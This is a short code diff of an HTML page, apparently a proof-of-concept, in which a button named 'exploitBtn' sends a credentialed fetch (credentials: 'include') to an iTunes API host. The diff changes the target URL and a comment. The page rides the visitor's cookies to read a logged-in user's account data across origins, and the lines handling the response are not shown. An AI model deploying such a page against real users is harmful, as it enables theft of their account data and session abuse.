@@ -10,9 +10,9 @@
 
     <script>
         document.getElementById('exploitBtn').addEventListener('click', () => {
-            fetch('https://uic.itunes.apple.com', {
+            fetch('https://uclient-api.itunes.apple.com', {
                 method: 'GET',
-                credentials: 'include' // Send cookies or authentication tokens
+                credentials: 'include' // Include cookies and credentials
             })
             .then(response => response.text())
             .then(data => {
@@ -25,3 +25,4 @@
     </script>
 </body>
 </html>
+
